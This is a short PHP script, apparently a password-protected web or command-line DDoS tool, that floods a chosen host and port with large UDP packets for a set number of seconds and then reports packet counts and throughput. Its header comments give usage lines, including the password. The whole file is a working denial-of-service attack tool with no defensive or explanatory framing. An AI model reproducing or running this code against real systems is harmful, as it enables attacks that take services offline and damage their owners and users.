<?php
//Server Usage:	http://127.0.0.1/ddos.php?pass=apple&host=DDoSTarget&port=PORT&time=SECOND
//CLI Usage:		php ./ddos.php host=DDoSTarget port=PORT time=SECOND pass=apple

if(isset($argv)) {
    parse_str(implode('&', array_slice($argv, 1)), $_GET);
}

if(isset($_GET['host'])&&isset($_GET['time'])&&isset($_GET['pass'])){
	
	$pass = $_GET['pass'];
	if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo $pass; exit();}
	
    $packets = 0; 
    $exec_time = $_GET['time']; 
    $max_time = time()+$exec_time; 
    $host = $_GET['host'];
    
    $packet_size = 65000;
    $out = str_repeat("0",$packet_size);
    
    while(time() < $max_time){
        $packets++;
        $port = (isset($_GET['port']) && strlen($_GET['port']) > 0) ?  $_GET['port'] : rand(1,65535);
        $fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 30);
        if(!$fp){
        	echo "$errstr ($errno)<br />\n";
        }else{
            fwrite($fp, $out);
            fclose($fp);
        }
    }
    
	echo "<br><b>DDoS UDP Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
}else{ 
	//echo "Missing parameters." ;
}
?>
